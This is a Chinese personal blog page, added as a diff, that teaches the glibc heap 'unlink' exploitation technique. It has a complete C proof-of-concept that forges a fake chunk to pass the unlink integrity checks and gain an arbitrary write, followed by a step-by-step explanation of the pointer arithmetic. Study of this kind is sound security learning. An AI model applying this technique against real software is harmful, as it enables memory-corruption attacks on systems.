@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Unlink - gravity的个人博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="GraVity0,"> 
+    <meta name="description" content="Unlink学习资料：https://blog.csdn.net/qq_41918771/article/details/100917350以前的unlink没检查，现在多了两项检查机制:
+
+1.u,"> 
+    <meta name="author" content="yuntao you"> 
+    <link rel="alternative" href="atom.xml" title="gravity的个人博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/first.jpg"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">gravity的个人博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">Unlink</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">Unlink</h1>
+        <div class="stuff">
+            <span>九月 03, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><p>学习资料：<a href="https://blog.csdn.net/qq_41918771/article/details/100917350" target="_blank" rel="noopener">https://blog.csdn.net/qq_41918771/article/details/100917350</a><br>以前的unlink没检查，现在多了两项检查机制:</p>
+<ul>
+<li>1.unlink chunk size是否等于next chunk(内存意义上的)的prev_size.    </li>
+<li>2.unlink 检查是否P-&gt;fd-&gt;bk == P 以及 P-&gt;bk-&gt;fd == P     </li>
+</ul>
+<h5 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h5><pre><code class="cpp">#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+
+struct chunk_structure {
+  size_t prev_size;
+  size_t size;
+  struct chunk_structure *fd;
+  struct chunk_structure *bk;
+  char buf[10];               // padding
+};
+
+int main() {
+  unsigned long long *chunk1, *chunk2;
+  struct chunk_structure *fake_chunk, *chunk2_hdr;
+  char data[20];
+
+  // First grab two chunks (non fast)
+  chunk1 = malloc(0x80);
+  chunk2 = malloc(0x80);
+  printf(&quot;%p\n&quot;, &amp;chunk1);
+  printf(&quot;%p\n&quot;, chunk1);
+  printf(&quot;%p\n&quot;, chunk2);
+
+  // Assuming attacker has control over chunk1&#39;s contents
+  // Overflow the heap, override chunk2&#39;s header
+
+  // First forge a fake chunk starting at chunk1
+  // Need to setup fd and bk pointers to pass the unlink security check
+  fake_chunk = (struct chunk_structure *)chunk1;
+  fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;fd-&gt;bk == P
+  fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;bk-&gt;fd == P
+
+  // Next modify the header of chunk2 to pass all security checks
+  chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
+  chunk2_hdr-&gt;prev_size = 0x80;  // chunk1&#39;s data region size
+  chunk2_hdr-&gt;size &amp;= ~1;        // Unsetting prev_in_use bit
+
+  // Now, when chunk2 is freed, attacker&#39;s fake chunk is &#39;unlinked&#39;
+  // This results in chunk1 pointer pointing to chunk1 - 3
+  // i.e. chunk1[3] now contains chunk1 itself.
+  // We then make chunk1 point to some victim&#39;s data
+  free(chunk2);
+  printf(&quot;%p\n&quot;, chunk1);
+  printf(&quot;%x\n&quot;, chunk1[3]);
+
+  chunk1[3] = (unsigned long long)data;
+
+  strcpy(data, &quot;Victim&#39;s data&quot;);
+
+  // Overwrite victim&#39;s data using chunk1
+  chunk1[0] = 0x002164656b636168LL;
+
+  printf(&quot;%s\n&quot;, data);
+
+  return 0;
+}
+</code></pre>
+<p>重点记录一下自己之前不是很懂的地方：       </p>
+<h6 id="1-先看这部分代码："><a href="#1-先看这部分代码：" class="headerlink" title="1.先看这部分代码："></a>1.先看这部分代码：</h6><pre><code class="cpp">fake_chunk = (struct chunk_structure *)chunk1;
+</code></pre>
+<p>可以看到开始先对fake_chunk赋值，之后fake_chunk与chunk1是相同的地址。但他们并不是完全相同。chunk1是malloc分配出来的，指向的是用户数据区域，不包括chunk header，但fake_chunk是由chunk1强制转换而来的，所以指向的是fake_chunk的chunk header。<br>chunk1：（如下图）<br><img src="https://i.loli.net/2019/09/30/VqdN9AjosHQgEuL.png" alt="20190917150555840.png"><br>fake_chunk：（如下图）<br><img src="https://i.loli.net/2019/09/30/vrk51c8iy72otIJ.png" alt="20190917150845120.png">       </p>
+<h6 id="2-通过检查"><a href="#2-通过检查" class="headerlink" title="2.通过检查"></a>2.通过检查</h6><pre><code class="cpp">fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;fd-&gt;bk == P
+fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;bk-&gt;fd == P
+</code></pre>
+<p>在分析代码之前，先看一下chunk1和从chunk2<br><img src="https://i.loli.net/2019/09/30/w5lK2ge9YLv1rxq.png" alt="20190917154121450.png"><br>我们可以看到这里主要进行的是指针运算，&amp;chunk1占8个字节。所以减3即减3*8共24个字节。即&amp;chunk1-3 = 0x7fffffffdf60-24=0x7FFFFFFFDF48。计算之后再进行强制转换，之后将结果赋值给fake_chunk-&gt;fd。下一个同理。    </p>
+<p>fake_chunk-&gt;fd的结构体：     </p>
+<p><img src="https://i.loli.net/2019/09/30/ncoQH3mw1vzNqfl.png" alt="20190917161434116.png"><br>fake_chunk-&gt;bk的结构体：<br><img src="https://i.loli.net/2019/09/30/KvcFYrjIONaAlPn.png" alt="20190917162450856.png"><br>这样就绕过了检测2。     </p>
+<p>接下来看怎么绕过检测1。     </p>
+<pre><code class="cpp">chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
+</code></pre>
+<p>这里是chunk2而不是&amp;chunk2。我们知道chunk2的地址是0x6020a0。并且是unsigned long long类型。即占8字节，所以chunk2-2 = 0x6020a0-16 = 0x602090。并强制转换为chunk_structure结构体。赋值给chunk2_hdr。  </p>
+<p>chunk2_hd结构：          </p>
+<p><img src="https://i.loli.net/2019/10/01/8C5U7Kj6qbyHB4c.png" alt="2019091716570953.png">       </p>
+<pre><code class="cpp">chunk2_hdr-&gt;prev_size = 0x80;  // chunk1&#39;s data region size
+chunk2_hdr-&gt;size &amp;= ~1
+</code></pre>
+<p>第一行是将chunk_hdr-&gt;prev_szie设置为0x80。第二行是将chunk_hdr-&gt;size的P位设置位0。这样就会以为上一个堆块是空闲状态并且大小是0x80。     </p>
+<p>接下来到free的地方，会让chunk2向前合并，即P-&gt;fd-&gt;bk = P-&gt;bk 和 P-&gt;bk-&gt;fd = P-&gt;fd。这里的P指ake_chunk。为什么指fake_chunk呢？因为当free(chunk2)的时候，看见P位是0，此时需要找到前一个chunk。该怎么找呢？当前chunk的mem地址减去当前chunk的prev_size。在本题，即chunk2的地址减去0x80。则是0x6020a0-0x80=0x602020。此时0x602020是fake_chunk2-&gt;fd。<br>这里在别的<a href="https://blog.csdn.net/qq_25201379/article/details/81545128" target="_blank" rel="noopener">博客</a>里看到一个图讲的不错，如下:<br><img src="https://i.loli.net/2019/10/01/Gn4tRd5zsW13fYP.png" alt="20180809222208662.png"><br>图中的ptr0和这里的chunk1是一个道理。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unlink"><span class="toc-number">1.</span> <span class="toc-text">Unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#实验"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">实验</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-先看这部分代码："><span class="toc-number">1.0.0.0.1.1.</span> <span class="toc-text">1.先看这部分代码：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-通过检查"><span class="toc-number">1.0.0.0.1.2.</span> <span class="toc-text">2.通过检查</span></a></li></ol></li></ol></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"lift","width":200,"height":350},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
